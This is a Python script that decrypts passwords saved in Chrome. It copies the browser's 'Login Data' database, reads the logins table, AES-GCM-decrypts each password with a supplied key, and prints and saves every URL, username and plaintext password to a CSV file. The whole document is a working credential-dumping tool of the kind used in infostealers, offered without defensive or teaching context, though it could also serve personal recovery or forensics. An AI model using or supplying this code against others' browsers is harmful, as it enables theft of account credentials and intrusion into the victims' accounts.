import os
import sqlite3
import csv
from Crypto.Cipher import AES
import shutil

def decrypt_payload(cipher, payload):
    """Decrypt the payload using the given cipher."""
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    """Generate AES cipher for decryption."""
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    """
    Decrypt the given ciphertext using the AES key.
    Chrome passwords are stored with a specific prefix.
    """
    try:
        # Initialization vector for AES decryption
        initialization_vector = ciphertext[3:15]
        # Encrypted password, excluding the suffix bytes
        encrypted_password = ciphertext[15:-16]
        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialization_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password).decode()  # Decode to string
        return decrypted_pass
    except Exception as e:
        print(f"[ERROR] Unable to decrypt password: {str(e)}")
        return ""

def extract_credentials(login_data_path, aes_key):
    """Extract and decrypt stored credentials from the Login Data file."""
    try:
        # Copy the database to avoid locking issues
        temp_db = "Loginvault.db"
        shutil.copy2(login_data_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        # Query the `logins` table
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        credentials = []

        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[1]
            ciphertext = login[2]

            if url and username and ciphertext:
                # Decrypt the password
                password = decrypt_password(ciphertext, aes_key)
                credentials.append((index, url, username, password))

        # Cleanup
        cursor.close()
        conn.close()
        os.remove(temp_db)

        return credentials
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return []

def save_to_csv(credentials, output_file="decrypted_passwords.csv"):
    """Save the decrypted credentials to a CSV file."""
    try:
        with open(output_file, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["Index", "URL", "Username", "Password"])
            writer.writerows(credentials)
        print(f"[INFO] Credentials saved to {output_file}")
    except Exception as e:
        print(f"[ERROR] Failed to save credentials to CSV: {str(e)}")

if __name__ == "__main__":
    try:
        # Input AES key and Login Data path
        aes_key_input = input("Enter the AES key (hex): ")
        aes_key = bytes.fromhex(aes_key_input)

        login_data_path = input("Enter the path to the 'Login Data' file: ")

        if not os.path.exists(login_data_path):
            print("[ERROR] Login Data file not found.")
            exit(1)

        # Extract and decrypt credentials
        credentials = extract_credentials(login_data_path, aes_key)

        # Print credentials to console
        if credentials:
            print("\nDecrypted Credentials:")
            for cred in credentials:
                print(f"Index: {cred[0]}, URL: {cred[1]}, Username: {cred[2]}, Password: {cred[3]}")
                print("-" * 50)

            # Save credentials to a CSV file
            save_to_csv(credentials)
        else:
            print("[INFO] No credentials found or decryption failed.")

    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {str(e)}")
